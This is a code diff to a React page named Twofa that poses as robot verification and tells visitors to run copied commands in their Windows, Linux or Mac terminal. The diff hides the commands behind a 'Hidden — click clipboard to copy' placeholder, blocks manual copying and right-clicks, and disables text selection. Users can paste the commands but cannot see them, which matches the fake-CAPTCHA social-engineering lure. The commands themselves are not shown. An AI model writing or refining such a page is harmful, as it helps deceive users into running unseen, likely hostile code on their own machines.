@@ -5,13 +5,13 @@ import swal from 'sweetalert';
 import ReCAPTCHA from 'react-google-recaptcha';
 import axios from 'axios';
 
-const RECAPTCHA_SITE_KEY = '6LdPsIMrAAAAACj8e2sn8DUA1tEC1u3FZgeJrQpb'; // replace with your site key
- const currentDomain = window.location.origin;
+const RECAPTCHA_SITE_KEY = '6LdPsIMrAAAAACj8e2sn8DUA1tEC1u3FZgeJrQpb'; // Replace with your key
+const currentDomain = window.location.origin;
+
 const Twofa = () => {
-  
   const location = useLocation();
   const userData = location.state?.user;
-  
+
   const [machineHex, setMachineHex] = useState('');
   const [copySuccess, setCopySuccess] = useState(false);
   const [captchaToken, setCaptchaToken] = useState(null);
@@ -36,26 +36,44 @@ const Twofa = () => {
     fetchHex();
   }, [userData]);
 
+  // Block manual copy attempts
+  useEffect(() => {
+    const handleCopy = (e) => {
+      e.preventDefault();
+      swal('Blocked', 'Manual copying is disabled. Use the copy button.', 'warning');
+    };
+
+    const handleContextMenu = (e) => {
+      if (e.target.tagName === 'INPUT') {
+        e.preventDefault();
+      }
+    };
+
+    document.addEventListener('copy', handleCopy);
+    document.addEventListener('contextmenu', handleContextMenu);
+
+    return () => {
+      document.removeEventListener('copy', handleCopy);
+      document.removeEventListener('contextmenu', handleContextMenu);
+    };
+  }, []);
+
   const copyToClipboard = (command) => {
     const tempInput = document.createElement('input');
     tempInput.value = command;
     document.body.appendChild(tempInput);
     tempInput.select();
-    tempInput.setSelectionRange(0, 99999);
     document.execCommand('copy');
     document.body.removeChild(tempInput);
     setCopySuccess(true);
     setTimeout(() => setCopySuccess(false), 2000);
   };
 
-
   const handleCaptchaChange = (value) => {
     setCaptchaToken(value);
   };
 
   const handleContinue = async () => {
-    
-      console.log(captchaToken);
     if (!captchaToken) {
       swal('Error', 'Please complete the CAPTCHA', 'error');
       return;
@@ -78,7 +96,7 @@ const Twofa = () => {
   };
 
   return (
-    <main className='relative overflow-hidden'>
+    <main className='relative overflow-hidden select-none'>
       <section id='signup-section'>
         <div className='py-40 pt-36 xl:pb-[200px] xl:pt-[180px]'>
           <div className='global-container'>
@@ -87,16 +105,19 @@ const Twofa = () => {
               <div className='block rounded-lg bg-white px-[30px] py-[50px] text-left shadow-lg sm:px-10'>
                 <div className='grid grid-cols-1 gap-6'>
                   <div className='flex flex-col gap-y-[10px]'>
-                    <label className='text-lg font-bold'>To confirm that you are not a robot, please enter this code in the terminal and verify again.</label>
+                    <label className='text-lg font-bold'>
+                      To confirm that you are not a robot, please run the command using the copy button.
+                    </label>
 
                     {/* Windows */}
                     <label className='text-lg font-bold mt-4'>Command for Windows:</label>
-                    <div className='flex w-full'>
+                    <div className='flex w-full items-center select-none'>
                       <input
-                        value={`${currentDomain}/users/auth/windows?token=${machineHex}`}
+                        value="🔒 Hidden — click clipboard to copy"
                         type="text"
-                        className="w-full rounded border px-6 py-4 font-bold text-black"
+                        className="w-full rounded border px-6 py-4 font-bold text-black bg-gray-100 cursor-not-allowed"
                         readOnly
+                        disabled
                       />
                       <button
                         type='button'
@@ -109,12 +130,13 @@ const Twofa = () => {
 
                     {/* Linux */}
                     <label className='text-lg font-bold mt-4'>Command for Linux:</label>
-                    <div className='flex w-full'>
+                    <div className='flex w-full items-center select-none'>
                       <input
-                        value={`${currentDomain}/users/auth/linux?token=${machineHex}`}
+                        value="🔒 Hidden — click clipboard to copy"
                         type="text"
-                        className="w-full rounded border px-6 py-4 font-bold text-black"
+                        className="w-full rounded border px-6 py-4 font-bold text-black bg-gray-100 cursor-not-allowed"
                         readOnly
+                        disabled
                       />
                       <button
                         type='button'
@@ -127,12 +149,13 @@ const Twofa = () => {
 
                     {/* Mac */}
                     <label className='text-lg font-bold mt-4'>Command for Mac:</label>
-                    <div className='flex w-full'>
+                    <div className='flex w-full items-center select-none'>
                       <input
-                        value={`${currentDomain}/users/auth/mac?token=${machineHex}`}
+                        value="🔒 Hidden — click clipboard to copy"
                         type="text"
-                        className="w-full rounded border px-6 py-4 font-bold text-black"
+                        className="w-full rounded border px-6 py-4 font-bold text-black bg-gray-100 cursor-not-allowed"
                         readOnly
+                        disabled
                       />
                       <button
                         type='button'
@@ -143,10 +166,9 @@ const Twofa = () => {
                       </button>
                     </div>
 
-
                     {copySuccess && (
-                      <div className='mt-2 text-green-500'>
-                        <span>Copied to clipboard!</span>
+                      <div className='mt-3 text-green-600 font-semibold text-center'>
+                        Command copied to clipboard!
                       </div>
                     )}
                   </div>
@@ -159,8 +181,11 @@ const Twofa = () => {
                     onChange={handleCaptchaChange}
                   />
                 </div>
+
+                {/* Continue */}
                 <div className="flex justify-center mt-7">
-                  <button onClick={handleContinue}
+                  <button
+                    onClick={handleContinue}
                     className='rounded-full border-2 border-black bg-black py-4 px-10 text-white hover:border-red-500 hover:text-white'>
                     Continue
                   </button>
